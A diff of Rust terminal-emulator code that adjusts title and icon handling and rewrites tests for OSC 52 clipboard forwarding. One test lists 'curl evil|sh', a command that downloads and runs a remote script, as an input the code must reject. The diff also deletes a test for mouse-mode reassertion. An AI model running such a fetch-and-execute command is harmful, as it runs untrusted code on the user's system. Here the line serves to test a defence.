@@ -712,9 +712,8 @@ impl OutOfBand {
         self.last_icon = icon.to_string();
         // The icon is prefixed only if equal to the title, which keeps them equal (mosh's
         // `prefix_window_title`).
-        let icon_eq_title = icon == title;
         let t = OscText::new(&format!("{}{title}", self.title_prefix));
-        let ic = if icon_eq_title {
+        let ic = if icon == title {
             t.clone()
         } else {
             OscText::new(icon)
@@ -1276,8 +1275,6 @@ mod tests {
 
     /// A wide glyph in the bottom-right cell never scrolls the user's terminal: autowrap is off
     /// while a frame paints, and a glyph that cannot fill its cells there is a blank.
-    /// A wide glyph in the bottom-right cell never scrolls the user's terminal: autowrap is off
-    /// while a frame paints, and a glyph that cannot fill its cells there is a blank.
     #[test]
     fn a_wide_glyph_in_the_bottom_right_cell_does_not_scroll() {
         let malformed = wide_in_the_last_column(5);
@@ -1675,10 +1672,19 @@ mod tests {
         }
     }
 
-    /// Whether each clipboard, new to a terminal with clipboard writes `on`, reaches it: once,
-    /// and never again while it stays the same.
-    fn forwards_clipboard(cases: &[(bool, &str, bool)]) {
-        for &(on, clipboard, forwarded) in cases {
+    /// Only base64 within the cap, and only with clipboard writes on: never raw shell injection,
+    /// nor a query (`OSC 52 ; c ; ?`, which would ask the user's terminal for their clipboard).
+    #[test]
+    fn only_a_base64_clipboard_within_the_cap_is_forwarded_and_only_when_on() {
+        let huge = "A".repeat(MAXIMUM_CLIPBOARD_SIZE.saturating_add(4));
+        // Each new to the terminal: forwarded once, and never again while it stays the same.
+        for (on, clipboard, forwarded) in [
+            (false, "aGVsbG8=", false),
+            (true, "aGVsbG8=", true),
+            (true, "curl evil|sh", false),
+            (true, "?", false),
+            (true, huge.as_str(), false),
+        ] {
             let mut oob = OutOfBand::default().with_clipboard(on);
             oob.prime(win("", "", "", 0));
             let scr = screen_of(b"");
@@ -1689,30 +1695,6 @@ mod tests {
             let again = oob_emit(&mut oob, &scr, win("", "", clipboard, 0));
             assert!(!again.contains("\x1b]52;"), "{again:?}");
         }
-    }
-
-    /// Only base64 within the cap, and only with clipboard writes on: never raw shell injection,
-    /// nor a query (`OSC 52 ; c ; ?`, which would ask the user's terminal for their clipboard).
-    #[test]
-    fn only_a_base64_clipboard_within_the_cap_is_forwarded_and_only_when_on() {
-        let huge = "A".repeat(MAXIMUM_CLIPBOARD_SIZE.saturating_add(4));
-        forwards_clipboard(&[
-            (false, "aGVsbG8=", false),
-            (true, "aGVsbG8=", true),
-            (true, "curl evil|sh", false),
-            (true, "?", false),
-            (true, &huge, false),
-        ]);
-    }
-
-    /// A program turning the mouse on has the real terminal report it, in SGR.
-    #[test]
-    fn out_of_band_reasserts_input_modes_on_change() {
-        let mut oob = OutOfBand::default();
-        oob_emit(&mut oob, &screen_of(b""), win("", "", "", 0));
-        let modes = screen_of(b"\x1b[?2004h\x1b[?1000h\x1b[?1005h");
-        let buf = oob_emit(&mut oob, &modes, win("", "", "", 0));
-        assert_eq!(buf, "\x1b[?1000h\x1b[?1006h");
     }
 
     /// What the first frame shows of the clipboard and bell was there before the client came, and
